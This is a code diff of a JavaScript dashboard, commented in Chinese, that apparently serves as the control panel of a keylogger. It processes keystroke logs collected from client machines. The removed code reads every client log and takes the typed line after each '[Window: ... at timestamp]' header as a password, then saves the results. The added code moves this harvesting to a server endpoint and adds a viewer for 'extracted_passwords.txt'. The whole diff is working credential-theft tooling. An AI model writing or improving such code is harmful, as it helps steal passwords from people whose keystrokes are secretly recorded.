@@ -727,64 +727,14 @@ function stopAutoRefresh() {
 async function extractPasswords() {
     try {
         showToast('正在提取密码...', 'success');
-        
-        // 获取所有日志文件
-        const logsResponse = await fetch('/api/logs');
-        const logs = await logsResponse.json();
-        const logFiles = logs.filter(log => log.filename.endsWith('.log'));
-        
-        if (logFiles.length === 0) {
-            showToast('无日志文件', 'error');
-            return;
-        }
-        
-        // 提取密码
-        let extractedPasswords = [];
-        for (const file of logFiles) {
-            try {
-                // 由于密码文件保存在根目录，我们需要找到对应的客户端ID
-                let clientId = null;
-                if (clients.length > 0) {
-                    clientId = clients[0].id;
-                } else {
-                    clientId = 'default:9999';
-                }
-                
-                const contentResponse = await fetch(`/api/clients/${clientId}/logs/${file.filename}/raw`);
-                const content = await contentResponse.text();
-                const passwords = extractPasswordsFromLog(content, file.filename);
-                extractedPasswords = [...extractedPasswords, ...passwords];
-            } catch (error) {
-                console.warn(`读取日志文件失败: ${file.filename}`, error);
-            }
-        }
-        
-        if (extractedPasswords.length === 0) {
-            showToast('未提取到密码', 'error');
-            return;
-        }
-        
-        // 保存提取结果到固定文件名
-        const resultFilename = 'extracted_passwords.txt';
-        const resultContent = extractedPasswords.map((item, index) => {
-            return `${index + 1}. 来自: ${item.file}\n时间: ${item.timestamp}\n内容: ${item.password}\n`;
-        }).join('\n');
-        
-        // 上传结果文件
-        const uploadResponse = await fetch('/api/upload/127.0.0.1', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'text/plain'
-            },
-            body: resultContent
+        const response = await fetch('/api/extract-passwords', {
+            method: 'POST'
         });
-        
-        if (uploadResponse.ok) {
-            showToast(`成功提取 ${extractedPasswords.length} 个密码，已保存到 ${resultFilename}`, 'success');
-            // 刷新日志列表，以便用户可以看到更新的密码文件
-            refreshLogs();
+        const result = await response.json();
+        if (result.success) {
+            showToast(`成功提取 ${result.count} 个密码，已保存到 extracted_passwords.txt`, 'success');
         } else {
-            showToast('保存提取结果失败', 'error');
+            showToast(`提取失败: ${result.error || '未知错误'}`, 'error');
         }
     } catch (e) {
         console.error('提取密码失败:', e);
@@ -792,54 +742,19 @@ async function extractPasswords() {
     }
 }
 
-// 从日志内容中提取密码
-function extractPasswordsFromLog(content, filename) {
-    const passwords = [];
-    const lines = content.split('\n');
-    
-    for (let i = 0; i < lines.length; i++) {
-        const line = lines[i].trim();
-        // 查找包含时间戳的行
-        if (line.startsWith('[Window:')) {
-            // 提取时间戳
-            const timestampMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
-            const timestamp = timestampMatch ? timestampMatch[1] : '未知';
-            
-            // 检查下一行是否包含密码
-            if (i + 1 < lines.length) {
-                const nextLine = lines[i + 1].trim();
-                // 密码模式：包含字母数字和可能的特殊键如 [RSHIFT][TAB] 等
-                if (nextLine && !nextLine.startsWith('[')) {
-                    passwords.push({
-                        file: filename,
-                        timestamp: timestamp,
-                        password: nextLine
-                    });
-                }
-            }
-        }
-    }
-    
-    return passwords;
-}
-
 // 查看密码提取结果
 async function viewLatestPasswords() {
     try {
-        // 直接查看固定的密码提取结果文件
-        const resultFilename = 'extracted_passwords.txt';
-        
-        // 由于密码文件保存在根目录，我们需要找到对应的客户端ID
-        // 这里简化处理，使用第一个客户端的ID
-        let clientId = null;
-        if (clients.length > 0) {
-            clientId = clients[0].id;
+        // 直接从服务器本地读取提取结果文件
+        const response = await fetch('/api/extract-passwords/view');
+        if (response.ok) {
+            const content = await response.text();
+            document.getElementById('logModalTitle').textContent = '提取的密码';
+            document.getElementById('logContent').textContent = content;
+            document.getElementById('logModal').classList.add('show');
         } else {
-            // 如果没有客户端，使用默认路径
-            clientId = 'default:9999';
+            showToast('查看失败，可能还没有提取过密码', 'error');
         }
-        
-        viewLog(clientId, resultFilename);
     } catch (e) {
         console.error('查看密码提取结果失败:', e);
         showToast('查看失败，可能还没有提取过密码', 'error');
